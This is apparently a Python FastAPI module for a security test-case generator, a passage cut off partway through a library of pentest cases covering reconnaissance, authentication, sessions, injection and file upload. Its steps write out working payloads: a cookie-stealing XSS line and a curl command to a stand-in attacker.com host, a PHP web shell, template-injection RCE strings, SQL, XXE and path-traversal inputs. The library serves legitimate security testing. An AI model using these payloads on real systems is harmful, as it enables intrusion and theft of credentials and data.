"""
Security Test Case Generator
- Standard mode: rule-based from curated 100+ case library (OWASP WSTG, PATT, pentester.land patterns)
- AI mode: Claude-powered contextual generation with SSE streaming
- Refresh mode: fetch recent CVEs from NVD and convert to test cases
"""

import json
import logging
from datetime import datetime, timezone
from typing import Annotated, AsyncGenerator

import anthropic
import httpx
from fastapi import APIRouter, Depends, HTTPException, status
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.core.config import get_settings
from app.core.dependencies import get_current_user
from app.models.db.user import User

logger = logging.getLogger(__name__)
settings = get_settings()

router = APIRouter(prefix="/test-generator", tags=["Test Generator"])

# ─────────────────────────────────────────────────────────────────────────────
# Test Case Library  (OWASP WSTG + PayloadsAllTheThings + pentester.land patterns)
# ─────────────────────────────────────────────────────────────────────────────

TEST_CASES: list[dict] = [

    # ── RECONNAISSANCE ────────────────────────────────────────────────────────
    {
        "id": "TC-R001", "title": "Subdomain Enumeration",
        "category": "Reconnaissance", "severity": "info",
        "description": "Discover hidden subdomains that may expose forgotten or unpatched services. Subdomains often host staging, admin, or legacy apps with weaker security.",
        "attack_pattern": "DNS brute-force combined with certificate transparency log mining.",
        "steps": [
            "Query certificate transparency logs (crt.sh, Censys) for wildcard and leaf certificates",
            "Perform DNS brute-force with common subdomain wordlists via ffuf or amass",
            "Use permutation engines (altdns, gotator) to find missed subdomains",
            "Verify live hosts via HTTP probing — httpx -l subdomains.txt -silent",
            "Screenshot all web services: gowitness scan -f live.txt",
        ],
        "expected_result": "Full map of active subdomains with IPs, hosting provider, and exposed services.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nuclei_tags": ["dns", "subdomain-takeover"], "ffuf_wordlist": "subdomains-top1million-5000.txt"},
        "applicable_to": ["web", "api"], "tags": ["recon", "passive", "dns"],
    },
    {
        "id": "TC-R002", "title": "DNS Zone Transfer",
        "category": "Reconnaissance", "severity": "high",
        "description": "Misconfigured DNS servers may allow unauthenticated zone transfers, exposing the full internal DNS record set.",
        "attack_pattern": "Attempt AXFR/IXFR requests against all authoritative nameservers.",
        "steps": [
            "Identify authoritative nameservers: dig NS <domain>",
            "Attempt AXFR: dig axfr @<nameserver> <domain>",
            "Try all nameservers — zone transfer may be allowed on only one",
            "Parse returned records for internal hostnames, mail servers, and IPs",
        ],
        "expected_result": "Zone transfer must be denied. Success exposes full internal infrastructure map.",
        "cwe": "CWE-284", "owasp": None,
        "tools": {"nmap": ["--script dns-zone-transfer", "-p 53"], "nuclei_tags": ["dns"]},
        "applicable_to": ["web", "network"], "tags": ["recon", "dns"],
    },
    {
        "id": "TC-R003", "title": "Google Dorking / Search Engine Recon",
        "category": "Reconnaissance", "severity": "medium",
        "description": "Search engine operators reveal exposed files, login panels, and cached sensitive pages.",
        "attack_pattern": "Targeted dorks using site:, filetype:, inurl:, intitle: operators.",
        "steps": [
            "site:<target> filetype:env OR filetype:config OR filetype:sql",
            "site:<target> inurl:admin OR inurl:login OR inurl:dashboard",
            "site:<target> intitle:\"index of\" OR intitle:\"directory listing\"",
            "site:<target> inurl:backup OR inurl:old OR inurl:dev",
            "site:<target> \"internal use only\" OR \"confidential\"",
        ],
        "expected_result": "No sensitive files or internal pages indexed by search engines.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["recon", "passive", "osint"],
    },
    {
        "id": "TC-R004", "title": "Git Repository Exposure",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Exposed .git directories allow full source code reconstruction including hardcoded secrets.",
        "attack_pattern": "Request /.git/HEAD — if accessible, use git-dumper to download the repository.",
        "steps": [
            "Request GET /.git/HEAD — look for 'ref: refs/heads/' response",
            "Request GET /.git/config to confirm exposure",
            "Use git-dumper to reconstruct the full repo: git-dumper http://target/.git/ ./output",
            "Search commit history: git log -p | grep -iE 'password|secret|key|token'",
            "Check .env, config.php, settings.py in history",
        ],
        "expected_result": ".git must return 403. Web server must block dotfile directories.",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "git"]},
        "applicable_to": ["web"], "tags": ["exposure", "secrets", "critical"],
    },
    {
        "id": "TC-R005", "title": "Environment File Exposure (.env)",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Exposed .env files contain DB credentials, API keys, JWT secrets, and cloud tokens.",
        "attack_pattern": "Request common env file paths directly.",
        "steps": [
            "GET /.env, /.env.local, /.env.production, /.env.backup",
            "GET /api/.env, /backend/.env, /app/.env",
            "Parse for DB_PASSWORD, SECRET_KEY, AWS_SECRET_ACCESS_KEY",
            "Use credentials against the app and cloud provider",
        ],
        "expected_result": "All env files must return 403/404 — never served by the web server.",
        "cwe": "CWE-538", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "config"]},
        "applicable_to": ["web", "api"], "tags": ["exposure", "secrets", "critical"],
    },
    {
        "id": "TC-R006", "title": "Hardcoded Secrets in Public Repositories",
        "category": "Reconnaissance", "severity": "critical",
        "description": "Developers accidentally commit API keys, passwords, and tokens to public GitHub repositories.",
        "attack_pattern": "Search GitHub for target org/domain strings combined with secret keywords.",
        "steps": [
            "Search GitHub: org:<target> password OR secret OR api_key",
            "Use trufflehog: trufflehog github --org=<target> --only-verified",
            "Use gitleaks on cloned repos: gitleaks detect --source=./repo",
            "Check commit history of all repos including forks",
            "Search Pastebin and similar sites for target domain",
        ],
        "expected_result": "No secrets in any public repository. Rotate any discovered credentials immediately.",
        "cwe": "CWE-798", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "token"]},
        "applicable_to": ["web", "api", "cloud"], "tags": ["secrets", "github", "osint"],
    },
    {
        "id": "TC-R007", "title": "ASN & IP Range Discovery",
        "category": "Reconnaissance", "severity": "info",
        "description": "Discovering an organization's full IP space via ASN lookup reveals infrastructure not linked to primary domains.",
        "attack_pattern": "Look up ASN via BGP data, then expand to full CIDR ranges.",
        "steps": [
            "Find ASN: whois <domain> | grep AS, or bgp.he.net search",
            "Get all CIDRs for ASN: whois -h whois.radb.net -- '-i origin AS<number>'",
            "Scan all IPs: nmap -sV -T4 --open <cidr>",
            "Correlate IPs to hostnames via reverse DNS",
            "Identify undiscovered assets not linked from main domain",
        ],
        "expected_result": "Full asset inventory across all owned IP ranges.",
        "cwe": "CWE-200", "owasp": None,
        "tools": {"nmap": ["-sV", "-T4", "--open"]},
        "applicable_to": ["network", "web"], "tags": ["recon", "passive", "asn"],
    },

    # ── AUTHENTICATION ────────────────────────────────────────────────────────
    {
        "id": "TC-A001", "title": "Default Credential Testing",
        "category": "Authentication", "severity": "critical",
        "description": "Services deployed with vendor default credentials are trivially compromised.",
        "attack_pattern": "Test well-known default credential pairs against all login interfaces.",
        "steps": [
            "Test: admin/admin, admin/password, root/root, admin/1234, guest/guest",
            "Test service defaults: Tomcat=tomcat/tomcat, Jenkins=admin/admin, Grafana=admin/admin",
            "Test MongoDB: mongo --host <target> (no auth)", "Test Redis: redis-cli -h <target> ping",
            "Test MySQL: mysql -u root -h <target> (no password)",
        ],
        "expected_result": "No service accepts default credentials.",
        "cwe": "CWE-1391", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["default-login", "panel"], "nmap": ["--script http-default-accounts"]},
        "applicable_to": ["web", "network", "api"], "tags": ["auth", "credentials", "critical"],
    },
    {
        "id": "TC-A002", "title": "Username Enumeration",
        "category": "Authentication", "severity": "medium",
        "description": "Different responses for valid vs. invalid usernames enable targeted attacks.",
        "attack_pattern": "Compare response content, status codes, and timing for valid vs. invalid usernames.",
        "steps": [
            "Submit login with invalid username — record response body, status, response time",
            "Submit login with valid username (admin, info@target.com) — compare response",
            "Test password reset: submit known email vs. random email — check response differences",
            "Test registration: try existing email — check if error reveals account existence",
            "Measure timing differences — valid accounts may respond faster due to bcrypt skip",
        ],
        "expected_result": "Identical response for valid and invalid usernames. Generic: 'Invalid credentials.'",
        "cwe": "CWE-204", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["exposure", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "enumeration"],
    },
    {
        "id": "TC-A003", "title": "JWT Token Security",
        "category": "Authentication", "severity": "high",
        "description": "Weak JWT implementations allow algorithm confusion, 'none' bypass, or weak secret brute-forcing.",
        "attack_pattern": "Decode JWT, attempt algorithm confusion, modify claims, test with crafted tokens.",
        "steps": [
            "Decode JWT at jwt.io — identify alg, iss, exp, and custom claims",
            "Test alg=none: create token with no signature and alg='none'",
            "RS256 → HS256 confusion: sign with server's public key as HMAC secret",
            "Brute-force HS256 secret: hashcat -a 0 -m 16500 <token> wordlist.txt",
            "Modify role/admin/user_id claims and re-sign with discovered secret",
            "Test missing exp validation: submit tokens with exp=0 or past timestamp",
        ],
        "expected_result": "Only properly signed tokens accepted. alg=none rejected. Strong secret (>256 bits).",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "tools": {"nuclei_tags": ["token", "auth", "jwt"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "jwt", "crypto"],
    },
    {
        "id": "TC-A004", "title": "Password Reset Poisoning",
        "category": "Authentication", "severity": "high",
        "description": "Password reset flows trusting the Host header can be poisoned to capture reset tokens.",
        "attack_pattern": "Manipulate Host or X-Forwarded-Host header during password reset.",
        "steps": [
            "Trigger a password reset for a test account",
            "Intercept and replace Host header with attacker domain",
            "Also test X-Forwarded-Host, X-Host, X-Forwarded-Server headers",
            "Check if reset email contains the poisoned domain in the reset URL",
            "Verify token capture by monitoring attacker domain for incoming requests",
        ],
        "expected_result": "Reset URLs must use configured base URL, not Host header.",
        "cwe": "CWE-640", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["auth", "password-reset"]},
        "applicable_to": ["web"], "tags": ["auth", "header-injection"],
    },
    {
        "id": "TC-A005", "title": "OAuth Misconfiguration",
        "category": "Authentication", "severity": "high",
        "description": "Open redirect_uri, missing state, or implicit flow misuse leads to account takeover via token theft.",
        "attack_pattern": "Manipulate redirect_uri parameter and test state parameter entropy.",
        "steps": [
            "Test redirect_uri bypass: append /../callback, open subdomain, parameter pollution",
            "Remove state parameter and repeat flow — check if accepted",
            "Test PKCE bypass: replace code_challenge with known value",
            "Test implicit flow token leakage in referrer headers",
            "Check if authorization code can be reused after exchange",
        ],
        "expected_result": "Strict redirect_uri allowlist. Mandatory state validation. PKCE enforced.",
        "cwe": "CWE-601", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["oauth", "auth"]},
        "applicable_to": ["web", "api"], "tags": ["auth", "oauth", "account-takeover"],
    },
    {
        "id": "TC-A006", "title": "2FA / MFA Bypass",
        "category": "Authentication", "severity": "high",
        "description": "MFA implementations are often bypassable via response manipulation, code reuse, backup codes, or direct endpoint access.",
        "attack_pattern": "Test MFA verification step for logic flaws and bypass vectors.",
        "steps": [
            "After entering correct password, intercept MFA challenge response",
            "Change response status from 401 to 200 — check if access granted without code",
            "Test OTP reuse: submit same 6-digit code twice within validity window",
            "Test code brute-force: 1000000 possible 6-digit codes — check for rate limiting",
            "Test direct endpoint access: skip MFA step entirely by requesting authenticated endpoint",
            "Test backup code brute-force if backup codes are short (< 8 chars)",
            "Test recovery flow: SMS fallback — check if SMS code has weaker policy",
        ],
        "expected_result": "MFA codes are single-use, rate-limited, and cannot be bypassed via response manipulation.",
        "cwe": "CWE-287", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["auth", "mfa", "2fa", "bypass"],
    },

    # ── SESSION MANAGEMENT ────────────────────────────────────────────────────
    {
        "id": "TC-S001", "title": "Session Fixation",
        "category": "Session Management", "severity": "high",
        "description": "If the session ID is not regenerated after login, an attacker who sets a known session ID can hijack the session after the victim authenticates.",
        "attack_pattern": "Pre-set a session ID, convince a victim to authenticate, then use the same ID.",
        "steps": [
            "Request the login page — record the session cookie value",
            "Authenticate with valid credentials — compare session cookie before and after login",
            "If session ID is the same after login — the app is vulnerable to session fixation",
            "Test if you can set an arbitrary session ID via Cookie header and have it accepted",
            "Verify: use the pre-login session ID after victim logs in to access their account",
        ],
        "expected_result": "Session ID must be regenerated on every successful authentication.",
        "cwe": "CWE-384", "owasp": "A07:2021",
        "tools": {"nuclei_tags": ["session"]},
        "applicable_to": ["web"], "tags": ["session", "auth"],
    },
    {
        "id": "TC-S002", "title": "Cookie Security Attributes",
        "category": "Session Management", "severity": "medium",
        "description": "Missing Secure, HttpOnly, and SameSite cookie attributes expose sessions to theft via XSS, network interception, and CSRF.",
        "attack_pattern": "Inspect all Set-Cookie headers against security attribute checklist.",
        "steps": [
            "Log in and inspect Set-Cookie headers in the response",
            "Check for HttpOnly flag — missing = XSS can steal cookie",
            "Check for Secure flag — missing = cookie sent over HTTP",
            "Check for SameSite=Strict or Lax — missing = CSRF risk",
            "Check cookie expiry — overly long-lived session cookies increase hijack window",
            "Test if session cookie is set on root domain (leaks to all subdomains)",
        ],
        "expected_result": "All session cookies: HttpOnly; Secure; SameSite=Lax; Path=/",
        "cwe": "CWE-614", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["headers", "misconfig"]},
        "applicable_to": ["web"], "tags": ["session", "cookie"],
    },
    {
        "id": "TC-S003", "title": "Session Persistence After Logout",
        "category": "Session Management", "severity": "high",
        "description": "Sessions that remain valid after logout allow attackers with stolen tokens to maintain access.",
        "attack_pattern": "Capture session token, log out, then reuse the captured token.",
        "steps": [
            "Log in and copy session cookie / Bearer token",
            "Log out via the application's logout function",
            "Replay the copied session token on an authenticated endpoint",
            "Check if the server still accepts the old token",
            "Test token invalidation on both client and server side",
        ],
        "expected_result": "All tokens must be server-side invalidated on logout. Reused tokens must return 401.",
        "cwe": "CWE-613", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["session", "logout"],
    },

    # ── WEB APPLICATION (OWASP Top 10) ────────────────────────────────────────
    {
        "id": "TC-W001", "title": "SQL Injection",
        "category": "Web Application", "severity": "critical",
        "description": "SQL injection allows reading/modifying DB content, auth bypass, and in some cases OS command execution.",
        "attack_pattern": "Insert SQL metacharacters into all input vectors.",
        "steps": [
            "Test all fields with: ', '', ;--, ' OR '1'='1, 1' AND SLEEP(5)--",
            "Test GET/POST params, headers (User-Agent, Cookie), and JSON body fields",
            "Time-based blind: ' AND SLEEP(5)-- (MySQL), '; WAITFOR DELAY '0:0:5'-- (MSSQL)",
            "sqlmap -u \"<url>?id=1\" --level=5 --risk=3 --dbs",
            "Test second-order injection in profile fields used in later queries",
        ],
        "expected_result": "All input parameterized. No SQL errors in response. No behavioral difference on injection.",
        "cwe": "CWE-89", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["sqli", "injection"]},
        "applicable_to": ["web", "api"], "tags": ["injection", "critical", "database"],
    },
    {
        "id": "TC-W002", "title": "Reflected XSS",
        "category": "Web Application", "severity": "high",
        "description": "User input echoed in the response without encoding allows script injection in the victim's browser.",
        "attack_pattern": "Inject script payloads into URL parameters, form fields, and headers.",
        "steps": [
            "Identify reflected parameters in URLs and forms",
            "Test: <script>alert(1)</script>, <img src=x onerror=alert(1)>, javascript:alert(1)",
            "Test encoding bypasses: HTML entities, URL encoding, Unicode, case variation",
            "Test in headers: User-Agent, Referer if reflected in error pages",
            "Confirm exploitability with a URL that triggers alert when clicked",
        ],
        "expected_result": "All reflected input HTML-encoded. CSP header set.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss"], "ffuf_wordlist": "xss.txt"},
        "applicable_to": ["web"], "tags": ["xss", "injection", "client-side"],
    },
    {
        "id": "TC-W003", "title": "Stored XSS",
        "category": "Web Application", "severity": "critical",
        "description": "Stored XSS persists in the database and fires in every victim's browser — enabling mass session hijacking.",
        "attack_pattern": "Inject script payloads into all persistent input fields.",
        "steps": [
            "Identify fields that store and later display user input (comments, profiles, names)",
            "Inject: <script>document.location='https://attacker.com/c?c='+document.cookie</script>",
            "Test rich text editors with SVG payloads and event handlers",
            "Verify the payload fires when another user (admin) views the page",
            "Test blind XSS payloads that fire in admin panels using XSS Hunter",
        ],
        "expected_result": "Stored content sanitized. CSP prevents inline script execution.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "stored"]},
        "applicable_to": ["web"], "tags": ["xss", "injection", "persistent"],
    },
    {
        "id": "TC-W004", "title": "Server-Side Request Forgery (SSRF)",
        "category": "Web Application", "severity": "critical",
        "description": "SSRF lets the server fetch internal services, cloud IMDS, or arbitrary URLs — leading to credential theft.",
        "attack_pattern": "Supply attacker-controlled URLs to any server-side fetch functionality.",
        "steps": [
            "Identify URL parameters for server-side fetching (webhooks, imports, PDF generators)",
            "Test IMDS: http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/",
            "Test internal hosts: http://localhost/, http://127.0.0.1/, http://10.0.0.1/",
            "Test DNS rebinding and URL redirectors to bypass allowlists",
            "Test protocol handlers: file://, dict://, gopher://",
        ],
        "expected_result": "Outgoing requests restricted to explicit allowlist. RFC 1918 addresses blocked.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf"]},
        "applicable_to": ["web", "api", "cloud"], "tags": ["ssrf", "injection", "critical"],
    },
    {
        "id": "TC-W005", "title": "XML External Entity (XXE) Injection",
        "category": "Web Application", "severity": "high",
        "description": "XML parsers with external entities enabled allow file disclosure, SSRF, and sometimes RCE.",
        "attack_pattern": "Submit crafted XML with external entity definitions to XML-parsing endpoints.",
        "steps": [
            "Identify XML-accepting endpoints (SOAP, XML API, file upload, XLSX/DOCX)",
            "Classic XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "Blind out-of-band: trigger DNS/HTTP to Burp Collaborator URL",
            "Test SVG uploads — SVGs are parsed XML",
            "Test XLSX/DOCX — zip archives with embedded XML",
        ],
        "expected_result": "XML parsers must disable external entity and DTD processing.",
        "cwe": "CWE-611", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["xxe"]},
        "applicable_to": ["web", "api"], "tags": ["xxe", "injection"],
    },
    {
        "id": "TC-W006", "title": "IDOR / Broken Access Control",
        "category": "Web Application", "severity": "high",
        "description": "Manipulating object IDs allows unauthorized access to other users' resources.",
        "attack_pattern": "Swap object IDs in URLs, request bodies, and headers.",
        "steps": [
            "Create two accounts (A and B). Obtain resource IDs for account A.",
            "While authenticated as B, access account A's resources by ID",
            "Test all HTTP methods: GET, PUT, DELETE, PATCH",
            "Test GUIDs — even non-sequential IDs may be guessable or leaked via other endpoints",
            "Test indirect references: filenames, email addresses used as lookup keys",
        ],
        "expected_result": "Every object access verifies ownership server-side. IDs alone don't grant access.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["idor", "access-control"],
    },
    {
        "id": "TC-W007", "title": "Path Traversal / LFI",
        "category": "Web Application", "severity": "high",
        "description": "Path traversal enables reading arbitrary files. With upload, it can lead to RCE via LFI.",
        "attack_pattern": "Inject traversal sequences into file path parameters.",
        "steps": [
            "Find path params: ?file=, ?page=, ?template=, ?include=",
            "Test: ../../../../etc/passwd, ..\\..\\windows\\win.ini",
            "URL-encoded: %2e%2e%2f, double-encoded %252e%252e%2f",
            "Null byte: ../../../../etc/passwd%00.jpg",
            "On Linux: /proc/self/environ, /etc/shadow, /var/log/apache2/access.log",
        ],
        "expected_result": "File paths validated against whitelist. Absolute paths from trusted base dirs only.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["lfi", "traversal"], "ffuf_wordlist": "LFI-gracefulsecurity-linux.txt"},
        "applicable_to": ["web", "api"], "tags": ["lfi", "path-traversal"],
    },
    {
        "id": "TC-W008", "title": "CSRF",
        "category": "Web Application", "severity": "medium",
        "description": "CSRF forces authenticated users to unknowingly execute state-changing actions via malicious links.",
        "attack_pattern": "Craft a forged request to a state-changing action and deliver to an authenticated user.",
        "steps": [
            "Identify state-changing actions without re-authentication",
            "Check for CSRF token — if missing, attempt the action without a token",
            "Test CSRF token validation: change it to random value, resubmit",
            "Check SameSite cookie attribute — None allows cross-origin CSRF",
            "Build PoC auto-submitting HTML form from another domain",
        ],
        "expected_result": "All state-changing requests require validated CSRF token. SameSite=Lax/Strict.",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["csrf"]},
        "applicable_to": ["web"], "tags": ["csrf", "client-side"],
    },
    {
        "id": "TC-W009", "title": "Open Redirect",
        "category": "Web Application", "severity": "medium",
        "description": "Open redirects enable phishing via trusted-looking URLs on the legitimate domain.",
        "attack_pattern": "Inject attacker URLs into redirect parameters.",
        "steps": [
            "Find: ?redirect=, ?next=, ?url=, ?return=, ?goto=",
            "Test: ?redirect=https://evil.com, ?redirect=//evil.com, ?redirect=/\\evil.com",
            "Test URL encoding bypasses and protocol-relative URLs",
            "Check if used in OAuth flows to steal authorization codes",
        ],
        "expected_result": "Redirects only to an internal allowlisted set of URLs.",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["redirect"]},
        "applicable_to": ["web", "api"], "tags": ["redirect", "phishing"],
    },
    {
        "id": "TC-W010", "title": "OS Command Injection",
        "category": "Web Application", "severity": "critical",
        "description": "Command injection allows arbitrary OS commands on the server — full system compromise.",
        "attack_pattern": "Inject OS command separators into inputs passed to shell functions.",
        "steps": [
            "Identify inputs used in system commands (ping, dig, nslookup, file converters)",
            "Test: ; whoami, | whoami, && whoami, $(whoami), `whoami`",
            "Blind: ; sleep 5 — confirm via response delay",
            "Out-of-band: ; curl https://attacker.com/$(whoami)",
            "Escalate: ; cat /etc/passwd, reverse shell payloads",
        ],
        "expected_result": "Never pass user input to shell. Use subprocess with list args. Strict validation.",
        "cwe": "CWE-78", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["rce", "injection"]},
        "applicable_to": ["web", "api", "network"], "tags": ["rce", "injection", "critical"],
    },

    # ── ADVANCED INJECTION ────────────────────────────────────────────────────
    {
        "id": "TC-INJ001", "title": "Server-Side Template Injection (SSTI)",
        "category": "Advanced Injection", "severity": "critical",
        "description": "Template injection allows code execution in template engines (Jinja2, Twig, Freemarker, Pebble).",
        "attack_pattern": "Inject template expressions into all user-controlled inputs rendered in templates.",
        "steps": [
            "Test: {{7*7}}, ${7*7}, #{7*7}, <%=7*7%> — a response containing 49 confirms injection",
            "Identify engine from error: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble",
            "Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "Twig RCE: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "Test in email templates, PDF generators, and error messages — all render user input",
        ],
        "expected_result": "User input must never be passed to template render functions. Use logic-less templates.",
        "cwe": "CWE-94", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ssti"]},
        "applicable_to": ["web", "api"], "tags": ["ssti", "rce", "injection", "critical"],
    },
    {
        "id": "TC-INJ002", "title": "HTTP Request Smuggling",
        "category": "Advanced Injection", "severity": "high",
        "description": "Conflicting Content-Length/Transfer-Encoding headers between front-end proxy and back-end server allow injecting requests into other users' sessions.",
        "attack_pattern": "Send ambiguous requests that front-end and back-end parse differently.",
        "steps": [
            "Identify if a reverse proxy (nginx, CDN) sits in front of the app server",
            "CL.TE: send request with both Content-Length and Transfer-Encoding headers",
            "Test payload: POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG",
            "TE.CL: reverse the priority — front-end uses TE, back-end uses CL",
            "Test TE obfuscation: Transfer-Encoding: xchunked, Transfer-Encoding:\\x09chunked",
            "Use Burp Suite's HTTP Request Smuggler extension for automated detection",
        ],
        "expected_result": "Front-end and back-end must use consistent header parsing. Normalize requests at proxy.",
        "cwe": "CWE-444", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["smuggling"]},
        "applicable_to": ["web"], "tags": ["smuggling", "http", "advanced"],
    },
    {
        "id": "TC-INJ003", "title": "NoSQL Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "MongoDB and other NoSQL databases are vulnerable to operator injection in JSON query parameters.",
        "attack_pattern": "Inject NoSQL operators into query parameters and JSON request bodies.",
        "steps": [
            "Test login: {\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
            "Test field extraction: {\"username\": {\"$regex\": \"^admin\"}}",
            "Test HTTP param: ?username[$ne]=invalid&password[$ne]=invalid",
            "Test $where operator injection: {\"$where\": \"this.password.length > 0\"}",
            "Blind extraction: enumerate each character with $regex and timing",
        ],
        "expected_result": "Input must be validated before use in queries. Use parameterized query APIs.",
        "cwe": "CWE-943", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["nosqli", "injection"]},
        "applicable_to": ["web", "api"], "tags": ["nosql", "injection", "database"],
    },
    {
        "id": "TC-INJ004", "title": "LDAP Injection",
        "category": "Advanced Injection", "severity": "high",
        "description": "LDAP queries built from user input allow auth bypass and directory enumeration.",
        "attack_pattern": "Inject LDAP special characters to modify query logic.",
        "steps": [
            "Test login with: *)(uid=*))(|(uid=*",
            "Test: admin)(&), admin)(|(password=*)",
            "Blind injection: inject payloads that change query behavior without error",
            "Try to enumerate all users: *)(objectClass=*)",
            "Test for LDAP injection in search and lookup fields",
        ],
        "expected_result": "Input must be escaped before inclusion in LDAP queries.",
        "cwe": "CWE-90", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["ldap"]},
        "applicable_to": ["web", "api"], "tags": ["ldap", "injection"],
    },
    {
        "id": "TC-INJ005", "title": "CRLF / HTTP Header Injection",
        "category": "Advanced Injection", "severity": "medium",
        "description": "Injecting CRLF sequences into headers allows response splitting, cache poisoning, and cookie injection.",
        "attack_pattern": "Inject %0d%0a into URL parameters or headers that are reflected in responses.",
        "steps": [
            "Test: GET /page?url=https://evil.com%0d%0aSet-Cookie:injected=1",
            "Test: GET /redirect?to=/%0d%0aContent-Length:0%0d%0a%0d%0a...",
            "Test injection in all parameters reflected in Location, Set-Cookie, or other headers",
            "Use URL-encoded variants: %0a (LF only), %0d%0a (CRLF), %E5%98%8A%E5%98%8D (Unicode)",
            "Attempt to inject a full fake HTTP response for cache poisoning",
        ],
        "expected_result": "All user input must be stripped of CR/LF characters before header inclusion.",
        "cwe": "CWE-93", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["crlf", "injection"]},
        "applicable_to": ["web"], "tags": ["crlf", "header-injection"],
    },
    {
        "id": "TC-INJ006", "title": "SMTP / Email Header Injection",
        "category": "Advanced Injection", "severity": "medium",
        "description": "User input in email fields (To, CC, Subject) allows sending spam or exfiltrating data via injected headers.",
        "attack_pattern": "Inject newlines and additional headers into email form fields.",
        "steps": [
            "Find contact forms, password reset, or notification features that send email",
            "In the 'From' or 'Subject' field, inject: test@test.com%0aCc:victim@target.com",
            "Test: test@test.com\\r\\nBcc:attacker@evil.com",
            "Verify if additional recipients receive the email",
            "Test if SMTP credentials or server details leak in error messages",
        ],
        "expected_result": "User input stripped of CR/LF before email header construction.",
        "cwe": "CWE-93", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["smtp", "email", "injection"],
    },

    # ── FILE UPLOAD ───────────────────────────────────────────────────────────
    {
        "id": "TC-FU001", "title": "Web Shell Upload via Extension Bypass",
        "category": "File Upload", "severity": "critical",
        "description": "Insecure file upload allows uploading executable files masquerading as images — leading to RCE.",
        "attack_pattern": "Bypass MIME type and extension checks to upload server-side code.",
        "steps": [
            "Upload a PHP web shell: <?php system($_GET['cmd']); ?> as shell.php",
            "Bypass extension check: shell.php.jpg, shell.pHp, shell.php%00.jpg, shell.phtml",
            "Bypass MIME check: change Content-Type to image/jpeg while keeping .php extension",
            "Bypass magic bytes: prepend GIF89a; before PHP code",
            "Locate uploaded file via directory enumeration and execute: /uploads/shell.php?cmd=id",
        ],
        "expected_result": "Upload must validate magic bytes AND extension AND use randomized filenames in non-executable dirs.",
        "cwe": "CWE-434", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["upload"]},
        "applicable_to": ["web"], "tags": ["upload", "rce", "critical"],
    },
    {
        "id": "TC-FU002", "title": "Path Traversal via Upload Filename",
        "category": "File Upload", "severity": "high",
        "description": "Filenames with traversal sequences can overwrite server files outside the upload directory.",
        "attack_pattern": "Inject path traversal into filename field of multipart upload.",
        "steps": [
            "Upload file with filename: ../../../../etc/cron.d/backdoor",
            "Test: ../../../var/www/html/shell.php",
            "URL-encoded: ..%2F..%2F..%2Fetc%2Fpasswd",
            "Test in Content-Disposition header within multipart body",
            "Verify if server writes file to the traversed path",
        ],
        "expected_result": "Filenames must be sanitized and stripped of path separators. Use server-generated names.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "path-traversal"],
    },
    {
        "id": "TC-FU003", "title": "SVG / XML Upload XSS",
        "category": "File Upload", "severity": "high",
        "description": "SVG files are XML that executes JavaScript when rendered in a browser. Uploading SVG enables XSS.",
        "attack_pattern": "Upload an SVG containing script tags or event handlers.",
        "steps": [
            "Create SVG: <svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
            "Upload as profile picture or document",
            "If served with Content-Type: image/svg+xml — XSS fires when accessed",
            "Test even if .svg is blocked — try: file.svg%00.png, file.svgz",
            "Test XML files with the same payload via doctype XXE",
        ],
        "expected_result": "SVG files must be sanitized or served with Content-Disposition: attachment.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "xss", "svg"],
    },
    {
        "id": "TC-FU004", "title": "Zip Slip via Archive Upload",
